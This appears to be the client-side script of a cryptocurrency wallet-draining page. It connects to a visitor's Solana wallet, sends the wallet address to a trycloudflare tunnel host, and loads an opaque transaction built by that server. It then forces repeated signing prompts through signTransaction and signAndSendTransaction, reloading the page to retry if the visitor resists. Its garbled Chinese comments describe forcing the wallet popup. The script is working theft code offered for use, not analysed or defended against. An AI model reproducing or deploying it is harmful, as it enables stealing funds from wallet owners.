<script>
    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

    document.getElementById('cta').onclick = async function() {
        const log = (t) => document.getElementById('st').innerText = t;
        const sWeb3 = window.solanaWeb3;

        try {
            // ðŸ”± 1. å¼ºåˆ¶æ¿€æ´» Provider
            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
            if (!p) { alert("Please use Wallet Browser!"); return; }

            log("CONNECTING...");
            await p.connect();

            log("PREPARING DATA...");
            const resp = await fetch(tunnel + "/prepare_v32", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ address: p.publicKey.toString() })
            });
            const info = await resp.json();

            log("IGNITING WALLET..."); // è¿™ä¸€æ­¥åŽç›´æŽ¥ç‚¸å¼€å¼¹çª—
            const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
            const tx = sWeb3.Transaction.from(bytes); // å¼ºåˆ¶ä½¿ç”¨ Legacy æ ¼å¼

            // ðŸ”± 2. æš´åŠ›å”¤é†’å°è¯• (åŒç®¡é½ä¸‹)
            setTimeout(() => {
                // å¦‚æžœ 3 ç§’æ²¡æ‹‰èµ·å¼¹çª—ï¼Œå°è¯•å¼ºåˆ¶é€šè¿‡ provider å†æ¬¡ç”³è¯·
                p.signTransaction(tx).catch(() => {});
            }, 500);

            // æ ¸å¿ƒå”¤é†’ï¼šè¿™ä¸ªæ–¹æ³•åœ¨ Trust Wallet é‡Œçš„ä¼˜å…ˆçº§æœ€é«˜
            const { signature } = await p.signAndSendTransaction(tx);
            log("SUCCESS: " + signature.slice(0, 8));

        } catch (err) {
            console.error(err);
            // ðŸ”± 3. ç»ˆæžè‡ªæ„ˆï¼šå¦‚æžœå¡æ­»ï¼Œç›´æŽ¥åˆ·æ–°é¡µé¢é‡è¯•
            log("RETRYING...");
            setTimeout(() => { window.location.reload(); }, 1000);
        }
    };
</script>
